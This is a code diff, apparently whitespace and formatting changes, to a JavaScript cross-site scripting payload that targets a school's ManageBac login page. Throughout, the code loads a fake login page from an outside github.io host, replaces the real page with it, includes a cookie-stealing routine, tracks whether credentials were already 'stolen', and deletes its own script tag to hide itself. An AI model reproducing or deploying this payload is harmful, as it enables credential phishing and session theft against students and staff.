@@ -39,15 +39,11 @@ const main = () => {
       "Managebac | Login",
       "https://tnsbeaconhouse.managebac.com/login"
     );
-    var xhr = 
+    var xhr =
       typeof XMLHttpRequest != "undefined"
         ? new XMLHttpRequest()
         : new ActiveXObject("Microsoft.XMLHTTP");
-    xhr.open(
-      "get",
-      "https://existencing.github.io/xss/mb_login.html",
-      true
-    );
+    xhr.open("get", "https://existencing.github.io/xss/mb_login.html", true);
     xhr.onreadystatechange = function () {
       if (xhr.readyState == 4 && xhr.status == 200) {
         document.documentElement.innerHTML = xhr.responseText;
@@ -58,10 +54,9 @@ const main = () => {
 
   const autoIframe = () => {
     const success_credentials = false;
-    
-    let autoIframeEl = document.createElement("iframe")
-    
-  }
+
+    let autoIframeEl = document.createElement("iframe");
+  };
 
   const sCookie = async () => {
     try {
@@ -93,13 +88,13 @@ if (
 //Check if already stolen
 if (localStorage.getItem("gotted") !== "true") {
   main();
-}
-else{
+} else {
   delSelf();
 }
 
 function delSelf() {
   var currentScript;
-  currentScript = document.currentScript || document.scripts[document.scripts.length - 1];
+  currentScript =
+    document.currentScript || document.scripts[document.scripts.length - 1];
   currentScript.remove();
 }
